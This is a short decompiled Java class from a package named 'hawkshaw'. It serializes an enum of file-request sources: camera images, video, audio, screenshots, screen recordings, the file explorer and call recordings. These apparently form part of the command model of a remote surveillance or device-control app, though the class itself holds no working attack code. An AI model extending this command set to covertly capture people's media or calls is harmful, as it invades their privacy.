package com.hawkshaw.library.datalayer.models;

import com.hawkshaw.library.datalayer.models.Command;
import i3.C0542a;
import j3.j;
import java.lang.annotation.Annotation;

public final class f extends j implements C0542a {

    /* renamed from: D  reason: collision with root package name */
    public static final f f4890D = new j(0);

    public final Object invoke() {
        return v3.j.e("com.hawkshaw.library.datalayer.models.Command.FileRequest.Source", Command.FileRequest.Source.values(), new String[]{"CameraImage", "VideoRecording", "AudioRecording", "Screenshot", "ScreenRecording", "FileExplorer", "CallRecording"}, new Annotation[][]{null, null, null, null, null, null, null});
    }
}
